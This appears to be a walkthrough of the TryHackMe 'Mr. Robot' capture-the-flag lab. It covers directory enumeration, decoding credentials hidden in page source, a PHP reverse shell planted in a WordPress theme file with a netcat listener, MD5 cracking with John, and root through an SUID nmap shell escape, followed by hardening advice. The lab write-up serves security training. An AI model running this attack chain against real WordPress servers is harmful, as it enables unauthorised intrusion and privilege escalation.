#  TryHackMe – Mr. Robot CTF Walkthrough

<img width="1436" height="763" alt="Screenshot (23)" src="https://github.com/user-attachments/assets/77c153c4-bbad-4149-bbe0-ce5fac5c683e" />


##  Overview

This box is a tribute to the TV series *Mr. Robot*, designed around compromising a WordPress-powered web server. It involves uncovering hidden credentials, deploying a reverse shell through WordPress theme injection, and escalating privileges using a vulnerable SUID binary. The challenge showcases realistic offensive security steps — reconnaissance, hash cracking, lateral movement, and post-exploitation — culminating in full root access.

---

##  Reconnaissance


I started with a basic web scan and discovered that the target was running WordPress over port 80.


<img width="1527" height="425" alt="Screenshot (6)" src="https://github.com/user-attachments/assets/7634bef7-68c9-4369-9ac6-89595e350931" />

<img width="1443" height="667" alt="Screenshot (9)" src="https://github.com/user-attachments/assets/aecb5eef-f595-4fed-b1b9-4b88ce92654a" />


Since we don't have the credentials for the wordpress, it is a good idea to see if there are any directories that might have some useful information for us. 

I used gobuster:
```bash
```bash
gobuster dir -u 10.10.43.47 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```
<img width="1525" height="808" alt="Screenshot (8)" src="https://github.com/user-attachments/assets/64fedf4d-6b3e-41f9-90ff-140aa6b3390f" />


****

## Valid Username 

Navigating to:

```text
http://10.10.43.47/robots.txt
```

This revealed:
```
fsocity.dic key-1-of-3.txt
```

Inside the /license directory, I looked inside the HTML source and found a base64 comment. I decoded it with cyberchef, and this revealed:
```
elliot:ER28-0652
```

<img width="1775" height="1059" alt="Screenshot (13)" src="https://github.com/user-attachments/assets/4dc3e2f7-2823-43c3-8a90-23d9365f5152" />
<img width="3440" height="1440" alt="Screenshot (14)" src="https://github.com/user-attachments/assets/a0ed016b-aac3-406c-a0bb-d3620dafedf6" />

We can use these for the wordpress credentials! And we are in!

<img width="1768" height="831" alt="Screenshot (15)" src="https://github.com/user-attachments/assets/c33a69d2-6d12-452d-8a42-9fd3e0d71d64" />


## Reverse Shell via WordPress Theme

I used WordPress’s built-in Theme Editor:

Appearance → Theme Editor → 404.php

<img width="1767" height="1039" alt="Screenshot (17)" src="https://github.com/user-attachments/assets/d50527c4-33b6-48a4-a206-63ab4bc79342" />

I pasted a PHP reverse shell into 404.php, saved changes, then triggered it by visiting a missing page. On my attacker machine:

```
nc -nvlp 4444
Shell received — user: daemon
```
<img width="1530" height="524" alt="Screenshot (20)" src="https://github.com/user-attachments/assets/7d828a9d-3672-40f7-b42f-41983b7e02ca" />

With access to the daemon user, I did the command:

```
cd /home/robot/
```

Here are two files:
```
key-2-of-3.txt
password.raw.md5

```

The password.raw.md5 was readable, so I saved the hash and cracked it with John:
```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

This recovered the password:
```
robot:abcdefghijklmnopqrstuvwxyz
```

Switched users:
```
su robot
```
Now we can successfully read key-2-of-3.txt

## Root Escalation via SUID nmap

Running sudo -l gave:
```
Sorry, user robot may not run sudo on ip-10-10-43-47.

```

I then scanned the SUID binaries:

```
find / -perm -4000 -type f 2>/dev/null

```

Found:
```
/usr/local/bin/nmap

```
Confirmed it was version 3.81, which supports interactive shell escape.

Executed:
```
/usr/local/bin/nmap --interactive

```

Inside the prompt:

```
!sh

```
<img width="1535" height="501" alt="Screenshot (22)" src="https://github.com/user-attachments/assets/a270343f-0ce6-47d9-84ae-ef4f5def26cc" />


We now have access to root!


## Final Thoughts 

This box was a great example of how small vulnerabilities — like exposed dictionaries, base64 credentials, theme access, and a SUID nmap binary — can be chained into full root compromise. Manual inspection made all the difference, especially when brute-force tools hit noise.

Theme-based shell injection was fast and effective, and privilege escalation via outdated nmap wrapped everything up cleanly. Each step reinforced how simple misconfigurations open big doors when left unchecked.

## Mitigations

This attack path could've been shut down early with some basic hardening:

- Disable plugin/theme editing in WordPress:  
  `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`

- Enforce login protection with rate-limiting or CAPTCHA

- Remove SUID from exploitable binaries

- Clean up exposed directories and remove leftover source code

- Apply least privilege across users and files


Thankyou for reading!!

























